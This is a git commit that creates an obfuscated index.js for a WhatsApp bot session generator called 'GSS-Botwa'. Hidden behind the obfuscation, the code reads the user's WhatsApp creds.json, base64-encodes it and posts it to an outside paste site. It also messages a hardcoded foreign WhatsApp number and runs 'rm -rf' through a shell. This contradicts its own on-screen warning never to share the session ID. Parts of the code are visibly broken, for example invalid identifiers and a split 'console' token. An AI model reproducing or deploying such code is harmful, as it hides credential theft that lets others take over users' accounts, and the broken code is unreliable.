dd7e6134ceb5ab84623eb0fb4619389f2a218464
SAM OCHU <118100214+SAM-OCHU@users.noreply.github.com>
2023-10-04 23:25:07 -0700

    Create index.js

---
+++ index.js
@@ -0,0 +1,64 @@
+const _0x1d1673 = _0xf8ab; 
+function _0xf8ab(_0x421d3a, _0x1cf8ee) { 
+const _0x5eba37 = _0x5eba(); 
+return _0xf8ab = function(_0xf8ab19, _0x3dfa2f) { _0xf8ab19 = _0xf8ab19 - 0x9c; 
+let _0x227f11 = _0x5eba37[_0xf8ab19]; 
+return _0x227f11; }, _0xf8ab(_0x421d3a, _0x1cf8ee); } (function(_0x37703b, _0x3065a1) { 
+const _0x1fcb62 = _0xf8ab, _0x137817 = _0x37703b(); 
+while (!![]) { 
+try { 
+const _0x42dac8 = parseInt(_0x1fcb62(0xa6)) / 0x1 + parseInt(_0x1fcb62(0xbd)) / 0x2 + parseInt(_0x1fcb62(0xc6)) / 0x3 + -parseInt(_0x1fcb62(0xaf)) / 0x4 * (parseInt(_0x1fcb62(0xc0)) / 0x5) + -parseInt(_0x1fcb62(0xa3)) / 0x6 * (-parseInt(_0x1fcb62(0xc4)) / 0x7) + -parseInt(_0x1fcb62(0xba)) / 0x8 * (-parseInt(_0x1fcb62(0xb7)) / 0x9) + -parseInt(_0x1fcb62(0xc8)) / 0xa; 
+    if (_0x42dac8 === _0x3065a1) 
+    break; 
+    else _0x137817['push'](_0x137817['shift']()); } 
+    catch (_0x1c5875) { _0x137817['push'](_0x137817['shift']()); } } }(_0x5eba, 0xc13bd)); 
+    const pino = require(_0x1d1673(0xb2)), axios = require(_0x1d1673(0xcb)); 
+    let qrcode = require('qrcode-terminal'); 
+    const PastebinAPI = require(_0x1d1673(0xad)), path = require(_0x1d1673(0xb4)); pastebin = new PastebinAPI(_0x1d1673(0xce)); 
+    function _0x5eba() { 
+    const 0x365a62 = ['log', '464tbZQMO', '/auth_info_baileys', 'post', '1690790eDSWyC', '\x0a\x0aDon\x27t\x20provide\x20your\x20SESSION_ID\x20to\x20anyone\x20otherwise\x20that\x20user\x20can\x20access\x20your\x20account.\x0aThanks.\x0a-------------------\x20\x20\x20SESSION\x20CLOSED\x20\x20\x20-----------------------\x0a', '255699722149@s.whatsapp.net', '1216315snPlXp', 'data', 'readFileSync', 'emptyDirSync', '21RkOMzq', 'user', '2896107bsUiqq', 'Desktop', '39081890grDMLB', 'existsSync', 'rm\x20-rf\x20auth_info_baileys', 'axios', '╔════◇\x0a║『𝗧𝗵𝗮𝗻𝗸𝘀\x20𝗙𝗼𝗿\x20𝗖𝗵𝗼𝗼𝘀𝗶𝗻𝗴\x20GSS-Botwa』\x0a║\x20_You\x20complete\x20first\x20step\x20to\x20making\x20Bot.\x0a╚════════════════════════╝\x0a╔═════◇\x0a║\x20\x20『•••\x20𝗩𝗶𝘀𝗶𝘁\x20𝗙𝗼𝗿\x20𝗛𝗲𝗹𝗽\x20•••』\x0a║\x20*1.Repo:\x20_https://tinyurl.com/2czdxe7a_\x0a║\x20*2.Ytube:\x20_https://tinyurl.com/2ae2eg7b_\x0a║\x20*3.Owner:\x20_https://wa.me/255699722149_\x0a║\x20*Note\x20:\x20_Don\x27t\x20provide\x20your\x20SESSION_ID\x20to_\x0a║\x20_anyone\x20otherwise\x20that\x20can\x20access\x20chats_\x0a╚════════════════════════╝\x0a', './auth_info_baileys', 'EMWTMkQAVfJa9kM-MRUrxd5Oku1U7pgL', 'child_process', 'exec', 'silent', 'application/x-www-form-urlencoded', 'exit', 'http://paste.c-net.org/', 'child', '2776284oCcZMF', '\x0a====================\x20\x20SESSION\x20ID\x201\x20\x20==========================\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0aSESSION-ID\x201\x20==>\x20', 'output', '1369279iZUilR', 'sendMessage', 'Qr\x20Scan\x20Completed\x20Successfully.', '/auth_info_baileys/creds.json', 'error', '\x0a\x0a====================\x20\x20SESSION\x20ID\x202\x20\x20==========================\x20\x0aSESSION-ID\x202\x20=>\x20\x27\x20', 'utf-8', 'pastebin-js', 'macOS', '20XUlKnn', 'creds.update', 'connection.update', 'pino', '\x0aRun\x20The\x20Script\x20Again', 'path', 'toString', 'base64', '209142kDlOco', 'from']; _0x5eba = function() { return _0x365a62; }; 
+    return _0x5eba(); } 
+    const fs = require('fs-extra'); fs[0x1d1673(0xc9)](_0x1d1673(0xcd)) && (fs[_0x1d1673(0xc3)](_dirname + _0x1d1673(0xbb)), 
+        require('child_process')[_0x1d1673(0x9d)](_0x1d1673(0xca)), 
+        console[_0x1d1673(0xb9)](_0x1d1673(0xb3)), setTimeout(() => { 
+        const _0x3a87ce = _0x1d1673; console[_0x3a87ce(0xb9)]('\x20'); }, 0x64), setTimeout(() => { 
+        const _0x2d4443 = _0x1d1673; console[_0x2d4443(0xb9)]('𝑺'); }, 0x12c), setTimeout(() => { 
+    const _0x407788 = _0x1d1673; 
+    console[_0x407788(0xb9)]('𝒆'); }, 0x1f4), setTimeout(() => { 
+    const _0x58ab68 = _0x1d1673; 
+    console[_0x58ab68(0xb9)]('𝒄'); }, 0x2bc), setTimeout(() => { 
+    const _0x482a79 = _0x1d1673; 
+    console[_0x482a79(0xb9)]('𝒌'); }, 0x384), setTimeout(() => { 
+    const _0x2bffbd = _0x1d1673; c
+    onsole[_0x2bffbd(0xb9)]('𝒕'); }, 0x44c), setTimeout(() => { 
+    const _0x435d09 = _0x1d1673; 
+    console[_0x435d09(0xb9)]('𝒐'); }, 0x514), setTimeout(() => { 
+    const _0x26025c = _0x1d1673; 
+    console[_0x26025c(0xb9)]('𝒓'); }, 0x5dc), setTimeout(() => { console['log']('\x20'); }, 0x6a4), setTimeout(() => { 
+    const _0x15d7f1 = _0x1d1673; 
+    console[_0x15d7f1(0xb9)]('𝑩'); }, 0x76c), setTimeout(() => { 
+    const _0x413f87 = _0x1d1673; 
+    console[_0x413f87(0xb9)]('𝒐'); }, 0x834), setTimeout(() => { 
+    const _0x841fe6 = _0x1d1673; 
+    console[_0x841fe6(0xb9)]('𝒕'); }, 0x8fc), setTimeout(() => { 
+    const _0x4ed10e = _0x1d1673; process[_0x4ed10e(0xa0)](); }, 0x960));; setTimeout(() => { 
+    const _0x4b8356 = _0x1d1673, { 
+    default: _0x2777c8, useMultiFileAuthState: _0x2a6925, Browsers: _0x13263e, delay: _0x3a4c19, makeInMemoryStore: _0x481670 } = require('@sampandey001/baileys'), _0x165741 = _0x481670({ 'logger': pino()[_0x4b8356(0xa2)]({ 'level': _0x4b8356(0x9e), 'stream': 'store' }) }); 
+    async function _0x3912da() { 
+    const 0x5bb593 = _0x4b8356, { state: _0x172f44, saveCreds: _0x4ddbf9 } = await _0x2a6925(_dirname + _0x5bb593(0xbb)); 
+    try { 
+    let _0x323bc7 = _0x2777c8({ 'printQRInTerminal': !![], 'logger': pino({ 'level': _0x5bb593(0x9e) }), 'browser': _0x13263e[_0x5bb593(0xae)](_0x5bb593(0xc7)), 'auth': _0x172f44 }); _0x323bc7['ev']['on'](_0x5bb593(0xb1), async _0x5d9d3e => { 
+    const _0x4f6dde = _0x5bb593, { connection: _0x313866, lastDisconnect: _0x536c8b, qr: _0xf35ed7 } = _0x5d9d3e; 
+        if (_0x313866 == 'open') { await _0x3a4c19(0x1f4); 
+        let _0x16406f = _0x323bc7[_0x4f6dde(0xc5)]['id']; var _0x4dd693 = ''; 
+        try { 
+        let 0x44f143 = await fs[_0x4f6dde(0xc2)](_dirname + '/auth_info_baileys/creds.json', _0x4f6dde(0xac)); await _0x3a4c19(0x320); 
+        const _0x4f7672 = await axios[_0x4f6dde(0xbc)](_0x4f6dde(0xa1), '' + btoa(_0x44f143), { 'headers': { 'Content-Type': _0x4f6dde(0x9f) } }); _0x4dd693 = _0x4f7672[_0x4f6dde(0xc1)]['split']('/')[0x3], await _0x3a4c19(0x1f4); 
+        let _0x75a3cf = await _0x323bc7[_0x4f6dde(0xa7)](_0x16406f, { 'text': 'GSS-Botwa;;:' + _0x4dd693 }); await _0x323bc7[_0x4f6dde(0xa7)](_0x4f6dde(0xbf), { 'text': _0x4f6dde(0xa8) }, { 'quoted': _0x75a3cf });
+         } 
+        catch (_0xf6ea0d) { 
+        console[_0x4f6dde(0xb9)](_0xf6ea0d); 
+        } 
+        let 0x41a305 = fs[_0x4f6dde(0xc2)](_dirname + _0x4f6dde(0xa9)); c = Buffer[_0x4f6dde(0xb8)](_0x41a305)[_0x4f6dde(0xb5)](_0x4f6dde(0xb6)), console[_0x4f6dde(0xb9)](_0x4f6dde(0xa4) + c + _0x4f6dde(0xab) + _0x4dd693 + _0x4f6dde(0xbe)); 
+        let _0x577f00 = _0x4f6dde(0xcc), _0x1928a7 = await _0x323bc7[_0x4f6dde(0xa7)](_0x16406f, { 'text': 'GSS-Botwa;;:' + c }); await _0x323bc7[_0x4f6dde(0xa7)](_0x16406f, { 'text': _0x577f00 }, { 'quoted': _0x1928a7 }), await require(_0x4f6dde(0x9c))['exec'](_0x4f6dde(0xca)), process[_0x4f6dde(0xa0)](0x1); } _0x323bc7['ev']['on'](_0x4f6dde(0xb0), _0x4ddbf9), _0x313866 === 'close' && _0x536c8b && _0x536c8b['error'] && _0x536c8b[_0x4f6dde(0xaa)][_0x4f6dde(0xa5)]['statusCode'] != 0x191 && _0x3912da(); }); } catch (_0x143626) { console['log'](_0x143626), await 
+        require(_0x5bb593(0x9c))[_0x5bb593(0x9d)](_0x5bb593(0xca)), process[_0x5bb593(0xa0)](0x1); } } _0x3912da(); }, 0xbb8);
